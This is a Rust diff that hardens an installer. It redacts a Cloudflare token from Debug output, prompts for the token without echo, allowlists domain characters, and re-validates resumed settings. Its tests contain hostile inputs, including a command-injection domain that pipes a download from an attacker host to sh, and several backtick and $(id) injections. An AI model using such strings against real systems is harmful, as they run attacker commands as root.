@@ -23,6 +23,31 @@ pub fn needs_acme_credential(apps: &[String]) -> bool {
     !apps.is_empty()
 }
 
+/// A secret that cannot be printed by accident.
+///
+/// The Cloudflare token is the one genuinely high-value credential this
+/// installer handles -- it grants DNS-zone-wide manipulation. Transport
+/// discipline (stdin only, never argv, never persisted) was already
+/// correct, but `#[derive(Debug)]` on the struct holding it meant a single
+/// future `dbg!(&answers)` would leak it with no test to catch that.
+#[derive(Clone, PartialEq, Eq)]
+pub struct Secret(String);
+
+impl Secret {
+    pub fn new(value: String) -> Self {
+        Self(value)
+    }
+    pub fn expose(&self) -> &str {
+        &self.0
+    }
+}
+
+impl std::fmt::Debug for Secret {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.write_str("<redacted>")
+    }
+}
+
 #[derive(Debug, PartialEq, Eq)]
 pub struct Answers {
     pub hostname: String,
@@ -33,7 +58,7 @@ pub struct Answers {
     /// The Cloudflare DNS-01 token, held in memory only. Never written to
     /// a file on the operator's machine and never logged; it reaches the
     /// host through `ferrum-apply put-secret` during stage 2.
-    pub cloudflare_token: Option<String>,
+    pub cloudflare_token: Option<Secret>,
 }
 
 /// A hostname must be a DNS label: it becomes `networking.hostName` and
@@ -52,13 +77,45 @@ fn validate_hostname(raw: &str) -> anyhow::Result<String> {
     Ok(h)
 }
 
+/// The ACME contact address. Same discipline as the SSO admin address.
+///
+/// # Errors
+/// When the address is not usable.
+fn validate_acme_email(raw: &str) -> anyhow::Result<String> {
+    crate::sso::validate_email(raw)
+}
+
+/// Validates a base domain as an **allowlist**, not a typo-catcher.
+///
+/// This value is interpolated into commands that run as root on the target
+/// (`verify::auth_checks`'s curl, among others). Rejecting whitespace and a
+/// missing dot is not a safety property: backticks, `$`, `;`, `|`, `&` and
+/// quotes all pass that. So only the characters a DNS name may actually
+/// contain are permitted, and each label is checked.
+///
+/// # Errors
+/// When the value is not a syntactically valid domain name.
 fn validate_domain(raw: &str) -> anyhow::Result<String> {
     let d = raw.trim().to_lowercase();
+    if d.is_empty() || d.len() > 253 {
+        anyhow::bail!("{d:?} is not a domain name");
+    }
     if !d.contains('.') || d.starts_with('.') || d.ends_with('.') {
         anyhow::bail!("{d:?} is not a domain name");
     }
-    if d.chars().any(char::is_whitespace) {
-        anyhow::bail!("{d:?} contains whitespace");
+    if !d.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-') {
+        anyhow::bail!(
+            "{d:?} contains characters that are not allowed in a domain name \
+             (letters, digits, '.' and '-' only)"
+        );
+    }
+    for label in d.split('.') {
+        if label.is_empty() || label.len() > 63 {
+            anyhow::bail!("{d:?} has a label that is empty or too long");
+        }
+        if label.starts_with('-') || label.ends_with('-') {
+            anyhow::bail!("{d:?} has a label starting or ending with '-'");
+        }
     }
     Ok(d)
 }
@@ -141,14 +198,7 @@ pub fn collect(io: &mut impl PromptIo) -> anyhow::Result<Answers> {
         Some(_) => Some(ask_valid(
             io,
             "Email for Let's Encrypt expiry notices:",
-            |s| {
-                let s = s.trim();
-                if s.contains('@') && s.contains('.') && !s.contains(' ') {
-                    Ok(s.to_string())
-                } else {
-                    anyhow::bail!("{s:?} is not an email address")
-                }
-            },
+            validate_acme_email,
         )?),
         None => None,
     };
@@ -172,14 +222,14 @@ pub fn collect(io: &mut impl PromptIo) -> anyhow::Result<Answers> {
              It is held in memory, written to no file\nhere, and encrypted to the \
              host's own key once the host exists.",
         );
-        let token = io.ask("Cloudflare API token:")?;
+        let token = io.ask_secret("Cloudflare API token:")?;
         if token.is_empty() {
             anyhow::bail!(
                 "a Cloudflare DNS-01 token is required to publish an app: \
                  modules/proxy/acme.nix refuses to build without it"
             );
         }
-        Some(token)
+        Some(Secret::new(token))
     } else {
         None
     };
@@ -218,22 +268,66 @@ pub fn from_stage2(body: &str, hostname: &str) -> anyhow::Result<Answers> {
         .unwrap_or_default();
     apps.sort();
 
+    // EVERY field is re-validated, exactly as a fresh run validates it.
+    //
+    // This file lives in the operator's bind mount and the installer tells
+    // them in as many words that the repository is theirs -- so between an
+    // interrupted run and a resume it can legitimately have been edited by
+    // hand, or by anything else with write access to that directory. A
+    // resume that skipped validation would accept a domain a fresh run
+    // would reject, and that value goes on to be interpolated into remote
+    // commands. "Don't re-ask" must never become "don't re-check."
+    let base_domain = match doc
+        .pointer("/proxy/baseDomain")
+        .and_then(serde_json::Value::as_str)
+    {
+        Some(d) => Some(validate_domain(d)?),
+        None => None,
+    };
+    let acme_email = match doc
+        .pointer("/proxy/acme/email")
+        .and_then(serde_json::Value::as_str)
+    {
+        Some(e) => Some(validate_acme_email(e)?),
+        None => None,
+    };
+    let admin_email = match doc
+        .pointer("/auth/adminEmail")
+        .and_then(serde_json::Value::as_str)
+    {
+        Some(e) => Some(crate::sso::validate_email(e)?),
+        None => None,
+    };
+    if sso_enabled && admin_email.is_none() {
+        anyhow::bail!(
+            "the recovered settings enable authentication but name no admin \
+             email; modules/proxy/authelia.nix asserts it is non-empty"
+        );
+    }
+    let unknown: Vec<&str> = apps
+        .iter()
+        .map(String::as_str)
+        .filter(|a| !CATALOG_APPS.contains(a))
+        .collect();
+    if !unknown.is_empty() {
+        anyhow::bail!(
+            "the recovered settings enable apps that are not in the catalog: {}",
+            unknown.join(", ")
+        );
+    }
+    let hostname = validate_hostname(hostname)?;
+
     Ok(Answers {
-        hostname: hostname.to_string(),
-        base_domain: doc
-            .pointer("/proxy/baseDomain")
-            .and_then(serde_json::Value::as_str)
-            .map(str::to_string),
-        acme_email: doc
-            .pointer("/proxy/acme/email")
-            .and_then(serde_json::Value::as_str)
-            .map(str::to_string),
+        hostname,
+        base_domain,
+        acme_email,
         sso: SsoDecision {
             enabled: sso_enabled,
-            admin_email: doc
-                .pointer("/auth/adminEmail")
-                .and_then(serde_json::Value::as_str)
-                .map(str::to_string),
+            // Never recovered from disk: consent is a fact about what the
+            // operator was shown and typed, not a property of a file that
+            // anything with write access could add.
+            unauthenticated_accepted: false,
+            admin_email,
         },
         apps,
         cloudflare_token: None,
@@ -264,7 +358,13 @@ mod tests {
     #[test]
     fn domains_must_look_like_domains() {
         assert_eq!(validate_domain(" TheSyms.ca ").unwrap(), "thesyms.ca");
-        for bad in ["localhost", ".a.com", "a.com.", "a b.com"] {
+        for bad in [
+            "localhost", ".a.com", "a.com.", "a b.com",
+            // The shapes that matter: this value reaches a remote root shell.
+            "example.com;curl$IFS-sattacker/p|sh",
+            "a.com`id`", "a.com$(id)", "a.com|id", "a.com&id", "a.com'x'", "a.com\"x\"",
+            "-a.com", "a-.com", "a..com",
+        ] {
             assert!(validate_domain(bad).is_err(), "accepted {bad:?}");
         }
     }
@@ -304,7 +404,7 @@ mod tests {
         assert_eq!(a.base_domain.as_deref(), Some("thesyms.ca"));
         assert_eq!(a.apps, vec!["plex", "sonarr"]);
         assert!(a.sso.enabled);
-        assert_eq!(a.cloudflare_token.as_deref(), Some("cf-token-value"));
+        assert_eq!(a.cloudflare_token.as_ref().map(Secret::expose), Some("cf-token-value"));
     }
 
     /// No domain means nothing is published, so neither ACME nor the token
@@ -354,7 +454,7 @@ mod tests {
             "the token must never be echoed back: {}",
             io.transcript()
         );
-        assert_eq!(a.cloudflare_token.as_deref(), Some("secret-token"));
+        assert_eq!(a.cloudflare_token.as_ref().map(Secret::expose), Some("secret-token"));
     }
 
     /// A resume must never re-prompt: the operator answered before
@@ -406,6 +506,32 @@ mod tests {
     fn a_recovered_document_without_auth_reads_as_sso_off() {
         let a = from_stage2(&serde_json::json!({ "apps": {} }).to_string(), "h").unwrap();
         assert!(!a.sso.enabled);
+    }
+
+    /// One `dbg!(&answers)` away from a leak, before this.
+    /// On screen, in scrollback, in a screen-share. Not worth it for the
+    /// one credential here that grants DNS-zone-wide control.
+    #[test]
+    fn the_token_is_asked_for_without_echo() {
+        let mut io = Scripted::new(&[
+            "saltbox", "thesyms.ca", "me@thesyms.ca", "sonarr", "", "a@b.co", "tok",
+        ]);
+        collect(&mut io).unwrap();
+        assert_eq!(io.secret_asks.len(), 1, "the token must use the non-echoing prompt");
+        assert!(io.secret_asks[0].contains("Cloudflare"));
+    }
+
+    #[test]
+    fn the_token_cannot_be_printed_by_debug() {
+        let mut io = Scripted::new(&[
+            "saltbox", "thesyms.ca", "me@thesyms.ca", "sonarr", "", "a@b.co", "super-secret",
+        ]);
+        let a = collect(&mut io).unwrap();
+        let rendered = format!("{a:?}");
+        assert!(!rendered.contains("super-secret"), "Debug leaked the token: {rendered}");
+        assert!(rendered.contains("<redacted>"), "{rendered}");
+        // ...and it is still retrievable where it is genuinely needed.
+        assert_eq!(a.cloudflare_token.as_ref().map(Secret::expose), Some("super-secret"));
     }
 
     #[test]
